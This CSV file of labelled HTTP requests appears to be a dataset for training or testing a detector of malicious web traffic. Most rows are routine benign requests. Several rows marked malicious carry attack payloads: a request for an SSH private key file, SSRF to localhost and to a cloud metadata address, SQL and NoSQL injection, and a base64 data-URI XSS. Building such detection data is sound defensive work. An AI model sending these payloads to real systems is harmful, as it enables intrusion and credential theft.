label,text
benign,"GET /static/img/banners/discount-avif.avif HTTP/1.1
Host: swift-shipping-solutions.io
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: max-age=0
DNT: 1"
benign,"POST /poll/87/vote HTTP/1.1
Host: civic-engage-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://civic-engage-platform.net/poll/87
Cookie: sessionid=ghd84kdkse92jwpv34mb5cfkoq

poll_id=87&choice_id=3"
benign,"GET /graphics/icons/arrow-down.svg HTTP/1.1
Host: cloud-dev-services.io
Accept: image/svg+xml,image/*,*/*;q=0.8
Referer: https://cloud-dev-services.io/api-docs
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Cache-Control: no-cache
Connection: keep-alive"
malicious,"PUT /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Length: 26

{""filePath"": ""/root/.ssh/id_rsa""}"
benign,"POST /api/vote HTTP/1.1
Host: rapid-polls.cloud
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
User-Agent: curl/7.88.1
Accept: */*
X-Forwarded-For: 192.168.43.11
Connection: close
Cookie: poll_session=xyz789123

poll_id=119&choice_id=2"
benign,"GET /static/css/print-stylesheet.css HTTP/1.1
Host: green-energy-solutions.org
User-Agent: Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept: text/css,*/*;q=0.1
Referer: https://green-energy-solutions.org/initiatives/solar-power
Cache-Control: no-store
Connection: keep-alive"
benign,"GET /whitepapers/2024/urban_development_report.pdf HTTP/1.1
Host: urban-planning-solutions.ai
Accept: application/pdf
Referer: https://urban-planning-solutions.ai/whitepapers/2024/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 58
Connection: keep-alive
Cookie: session_token=7b3a1f9d6c4e59a71e2f4ea5c097b372

{""reportUrl"": ""http://2130706433/admin/overview?detail=full""}"
benign,"POST /signup/newsletter HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://community.game-dev-forum.org/forums/announcements
Connection: keep-alive

email=josephine.smith%40gamedevforum.org"
benign,"GET /swagger.json HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Via: 1.1 vegur"
malicious,"POST /api/member/authenticate HTTP/1.1
Host: portal-hrm-advanced.com
Content-Type: application/json
Content-Length: 144
Accept: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
X-CSRF-Token: 65b982f4-e8af-4a5b-9598-bd4e11352f9a

{""memberId"":""user087"",""passcode"":""letMeIn' AnD (SeLeCt UsErNaMe from members where id=1)='admin'-- ""}"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: login.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://dashboard.secure-user-portal.net/app/home"
benign,"GET /music/playlists?genre=jazz&genre=blues&genre=soul&quality=high HTTP/1.1
Host: rhythm-vibes.fm
Accept: audio/mpeg, audio/*; q=0.9, */*; q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"GET /api/fetch_image?imageUrl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: media-secure-harvester.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://media-secure-harvester.net/gallery/view
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"POST /api/v2/search/users HTTP/1.1
Host: api.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sessionId=3f4d2a7b-eecf-4a5b-bf1d-8c9a2d1f7f2e

{""query"": {""$where"": ""this.username == 'admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"POST /events/registration HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Accept-Encoding: gzip, deflate, br
Origin: https://online-retail-store.biz
Connection: keep-alive

event_id=summer_sale&attendance[]=in_person&attendance[]=virtual"
